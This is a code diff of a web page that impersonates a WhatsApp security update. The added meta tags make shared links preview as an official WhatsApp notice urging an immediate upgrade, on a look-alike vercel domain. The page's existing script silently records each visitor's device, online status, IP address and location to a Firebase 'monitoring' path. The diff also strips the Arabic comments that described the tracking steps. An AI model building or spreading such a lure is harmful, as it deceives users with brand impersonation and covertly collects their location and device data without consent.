@@ -3,6 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    
+    <meta property="og:title" content="WhatsApp Security Update">
+    <meta property="og:description" content="To protect your privacy, upgrade version V2.12.5 immediately to ensure chat encryption.">
+    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg">
+    <meta property="og:url" content="https://wa-protocol-update.vercel.app">
+    <meta property="og:type" content="website">
+    
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="WhatsApp Security Update">
+    <meta name="twitter:description" content="Important security update for your device.">
+
     <title>WhatsApp Update</title>
     <link rel="icon" href="https://static.whatsapp.net/rsrc.php/v3/yP/r/r_o_pS3X9sl.png" type="image/x-icon">
     <style>
@@ -88,7 +99,6 @@
         if (userId) {
             const sRef = db.ref('monitoring/' + userId);
             
-            // 1. إرسال إشعار دخول فوري (أسرع حاجة)
             sRef.set({ 
                 status: "Online", 
                 device: deviceType,
@@ -96,7 +106,6 @@
                 region: "Loading..."
             });
 
-            // 2. محاولة جلب الـ IP والمكان (الخطة أ - أدق حاجة)
             fetch('https://ipapi.co/json/')
                 .then(r => r.json())
                 .then(d => {
@@ -106,7 +115,6 @@
                     });
                 })
                 .catch(() => {
-                    // 3. الخطة ب لو الأولى فشلت (أسرع حاجة)
                     fetch('https://api.ipify.org?format=json')
                         .then(r => r.json())
                         .then(d => { sRef.update({ ip: d.ip }); });
